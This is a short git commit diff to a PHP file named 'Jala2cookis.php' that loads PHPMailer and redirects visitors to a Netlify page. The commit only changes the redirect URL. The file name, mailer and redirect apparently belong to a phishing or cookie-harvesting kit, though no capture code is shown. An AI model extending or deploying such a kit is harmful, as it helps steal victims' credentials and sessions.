47a9cd4d3e5a90ace8438b8059b6c086f4e33c62
Lernamzaxal892 <lernayouamzaxal@gmail.com>
2025-08-13 21:37:27 +0500

    Update Jala2cookis.php

--- Jala2cookis.php
+++ Jala2cookis.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://admirable-buttercream-77bbee.netlify.app/");
+header("Location: https://loquacious-tanuki-f198db.netlify.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
